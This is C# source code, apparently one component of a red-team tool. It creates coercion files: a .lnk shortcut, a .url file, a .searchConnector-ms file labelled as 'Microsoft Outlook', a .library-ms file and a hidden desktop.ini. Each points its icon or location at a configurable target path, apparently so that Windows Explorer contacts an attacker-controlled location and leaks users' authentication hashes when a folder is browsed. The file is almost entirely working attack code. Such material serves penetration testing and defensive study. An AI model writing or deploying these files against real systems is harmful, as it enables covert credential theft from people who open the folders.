﻿using System;
using System.Text;
using System.Runtime.InteropServices;

namespace Crop
{

    class Crop
    {

        // https://stackoverflow.com/questions/139010/how-to-resolve-a-lnk-in-c-sharp
        #region Signitures imported from http://pinvoke.net

        [DllImport("shfolder.dll", CharSet = CharSet.Auto)]
        internal static extern int SHGetFolderPath(IntPtr hwndOwner, int nFolder, IntPtr hToken, int dwFlags, StringBuilder lpszPath);

        [Flags()]
        enum SLGP_FLAGS
        {
            /// <summary>Retrieves the standard short (8.3 format) file name</summary>
            SLGP_SHORTPATH = 0x1,
            /// <summary>Retrieves the Universal Naming Convention (UNC) path name of the file</summary>
            SLGP_UNCPRIORITY = 0x2,
            /// <summary>Retrieves the raw path name. A raw path is something that might not exist and may include environment variables that need to be expanded</summary>
            SLGP_RAWPATH = 0x4
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct WIN32_FIND_DATAW
        {
            public uint dwFileAttributes;
            public long ftCreationTime;
            public long ftLastAccessTime;
            public long ftLastWriteTime;
            public uint nFileSizeHigh;
            public uint nFileSizeLow;
            public uint dwReserved0;
            public uint dwReserved1;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string cFileName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 14)]
            public string cAlternateFileName;
        }

        [Flags()]
        enum SLR_FLAGS
        {
            /// <summary>
            /// Do not display a dialog box if the link cannot be resolved. When SLR_NO_UI is set,
            /// the high-order word of fFlags can be set to a time-out value that specifies the
            /// maximum amount of time to be spent resolving the link. The function returns if the
            /// link cannot be resolved within the time-out duration. If the high-order word is set
            /// to zero, the time-out duration will be set to the default value of 3,000 milliseconds
            /// (3 seconds). To specify a value, set the high word of fFlags to the desired time-out
            /// duration, in milliseconds.
            /// </summary>
            SLR_NO_UI = 0x1,
            /// <summary>Obsolete and no longer used</summary>
            SLR_ANY_MATCH = 0x2,
            /// <summary>If the link object has changed, update its path and list of identifiers.
            /// If SLR_UPDATE is set, you do not need to call IPersistFile::IsDirty to determine
            /// whether or not the link object has changed.</summary>
            SLR_UPDATE = 0x4,
            /// <summary>Do not update the link information</summary>
            SLR_NOUPDATE = 0x8,
            /// <summary>Do not execute the search heuristics</summary>
            SLR_NOSEARCH = 0x10,
            /// <summary>Do not use distributed link tracking</summary>
            SLR_NOTRACK = 0x20,
            /// <summary>Disable distributed link tracking. By default, distributed link tracking tracks
            /// removable media across multiple devices based on the volume name. It also uses the
            /// Universal Naming Convention (UNC) path to track remote file systems whose drive letter
            /// has changed. Setting SLR_NOLINKINFO disables both types of tracking.</summary>
            SLR_NOLINKINFO = 0x40,
            /// <summary>Call the Microsoft Windows Installer</summary>
            SLR_INVOKE_MSI = 0x80
        }


        /// <summary>The IShellLink interface allows Shell links to be created, modified, and resolved</summary>
        [ComImport(), InterfaceType(ComInterfaceType.InterfaceIsIUnknown), Guid("000214F9-0000-0000-C000-000000000046")]
        interface IShellLinkW
        {
            /// <summary>Retrieves the path and file name of a Shell link object</summary>
            void GetPath([Out(), MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszFile, int cchMaxPath, out WIN32_FIND_DATAW pfd, SLGP_FLAGS fFlags);
            /// <summary>Retrieves the list of item identifiers for a Shell link object</summary>
            void GetIDList(out IntPtr ppidl);
            /// <summary>Sets the pointer to an item identifier list (PIDL) for a Shell link object.</summary>
            void SetIDList(IntPtr pidl);
            /// <summary>Retrieves the description string for a Shell link object</summary>
            void GetDescription([Out(), MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszName, int cchMaxName);
            /// <summary>Sets the description for a Shell link object. The description can be any application-defined string</summary>
            void SetDescription([MarshalAs(UnmanagedType.LPWStr)] string pszName);
            /// <summary>Retrieves the name of the working directory for a Shell link object</summary>
            void GetWorkingDirectory([Out(), MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszDir, int cchMaxPath);
            /// <summary>Sets the name of the working directory for a Shell link object</summary>
            void SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)] string pszDir);
            /// <summary>Retrieves the command-line arguments associated with a Shell link object</summary>
            void GetArguments([Out(), MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszArgs, int cchMaxPath);
            /// <summary>Sets the command-line arguments for a Shell link object</summary>
            void SetArguments([MarshalAs(UnmanagedType.LPWStr)] string pszArgs);
            /// <summary>Retrieves the hot key for a Shell link object</summary>
            void GetHotkey(out short pwHotkey);
            /// <summary>Sets a hot key for a Shell link object</summary>
            void SetHotkey(short wHotkey);
            /// <summary>Retrieves the show command for a Shell link object</summary>
            void GetShowCmd(out int piShowCmd);
            /// <summary>Sets the show command for a Shell link object. The show command sets the initial show state of the window.</summary>
            void SetShowCmd(int iShowCmd);
            /// <summary>Retrieves the location (path and index) of the icon for a Shell link object</summary>
            void GetIconLocation([Out(), MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszIconPath,
                int cchIconPath, out int piIcon);
            /// <summary>Sets the location (path and index) of the icon for a Shell link object</summary>
            void SetIconLocation([MarshalAs(UnmanagedType.LPWStr)] string pszIconPath, int iIcon);
            /// <summary>Sets the relative path to the Shell link object</summary>
            void SetRelativePath([MarshalAs(UnmanagedType.LPWStr)] string pszPathRel, int dwReserved);
            /// <summary>Attempts to find the target of a Shell link, even if it has been moved or renamed</summary>
            void Resolve(IntPtr hwnd, SLR_FLAGS fFlags);
            /// <summary>Sets the path and file name of a Shell link object</summary>
            void SetPath([MarshalAs(UnmanagedType.LPWStr)] string pszFile);

        }

        [ComImport, Guid("0000010c-0000-0000-c000-000000000046"),
        InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IPersist
        {
            [PreserveSig]
            void GetClassID(out Guid pClassID);
        }


        [ComImport, Guid("0000010b-0000-0000-C000-000000000046"),
        InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IPersistFile : IPersist
        {
            new void GetClassID(out Guid pClassID);
            [PreserveSig]
            int IsDirty();

            [PreserveSig]
            void Load([In, MarshalAs(UnmanagedType.LPWStr)] string pszFileName, uint dwMode);

            [PreserveSig]
            void Save([In, MarshalAs(UnmanagedType.LPWStr)] string pszFileName,
                [In, MarshalAs(UnmanagedType.Bool)] bool fRemember);

            [PreserveSig]
            void SaveCompleted([In, MarshalAs(UnmanagedType.LPWStr)] string pszFileName);

            [PreserveSig]
            void GetCurFile([In, MarshalAs(UnmanagedType.LPWStr)] string ppszFileName);
        }

        const uint STGM_READ = 0;
        const int MAX_PATH = 260;

        // CLSID_ShellLink from ShlGuid.h 
        [
            ComImport(),
            Guid("00021401-0000-0000-C000-000000000046")
        ]
        public class ShellLink
        {
        }

        #endregion
        public static void CreateLNKCrop(string destOut)
        {
            var shellLink = new ShellLink();
            ((IShellLinkW)shellLink).SetDescription("Shortcut");
            ((IShellLinkW)shellLink).SetPath(Config.targetPath);
            ((IShellLinkW)shellLink).SetIconLocation(Config.targetIcon, 12);
            ((IPersistFile)shellLink).Save(destOut, false);

        }

        public static void CreateFileCrop(string destOut)
        {
            var urlstr = "[InternetShortcut]\nURL=farmer\nWorkingDirectory=farmer\nIconFile=" + Config.targetPath + "\\%USERNAME%.icon\nIconIndex=1";

            var searchconnectorstr =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<searchConnectorDescription xmlns=\"http://schemas.microsoft.com/windows/2009/searchConnector\">\n" +
                "    <iconReference>imageres.dll,-1002</iconReference>\n" +
                "    <description>Microsoft Outlook</description>\n" +
                "    <isSearchOnlyItem>false</isSearchOnlyItem>\n" +
                "    <includeInStartMenuScope>true</includeInStartMenuScope>\n" +
                "    <iconReference>" + Config.targetPath + "</iconReference>\n" +
                "    <templateInfo>" +
                "        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>\n" +
                "    </templateInfo>\n" +
                "    <simpleLocation>\n" +
                "        <url>" + Config.targetPath + "</url>\n" +
                "    </simpleLocation>\n" +
                "</searchConnectorDescription>\n";

            var librarymsstr =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\">\n" +
                "  <name>@windows.storage.dll,-34582</name>\n" +
                "  <version>6</version>\n" +
                "  <isLibraryPinned>true</isLibraryPinned>\n" +
                "  <iconReference>imageres.dll,-1003</iconReference>\n" +
                "  <templateInfo>" +
                "    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>\n" +
                "  </templateInfo>\n" +
                "  <searchConnectorDescriptionList>\n" +
                "    <searchConnectorDescription>\n" +
                "      <isDefaultSaveLocation>true</isDefaultSaveLocation>\n" +
                "      <isSupported>false</isSupported>\n" +
                "      <simpleLocation>\n" +
                "      <url>" + Config.targetPath + "</url>\n" +
                "      </simpleLocation>\n" +
                "    </searchConnectorDescription>\n" +
                "  </searchConnectorDescriptionList>\n" +
                "</libraryDescription>";

            var shellclassinfostr =
                "[.ShellClassInfo]\n" +
                "IconResource="+Config.targetPath+"\n";


            var output = "";

            if (Config.targetFilename.ToLower().EndsWith(".url"))
                output = urlstr;
            else if (Config.targetFilename.ToLower().EndsWith(".searchconnector-ms"))
                output = searchconnectorstr;
            else if (Config.targetFilename.ToLower().EndsWith(".library-ms"))
                output = librarymsstr;
            else if (Config.targetFilename.ToLower()=="desktop.ini")
                output = shellclassinfostr;

            System.IO.File.WriteAllText(destOut, output);
            if (Config.targetFilename.ToLower() == "desktop.ini")
            {
                System.IO.File.SetAttributes(destOut, System.IO.File.GetAttributes(destOut) | System.IO.FileAttributes.Hidden | System.IO.FileAttributes.System);
            }
        }
    }
}
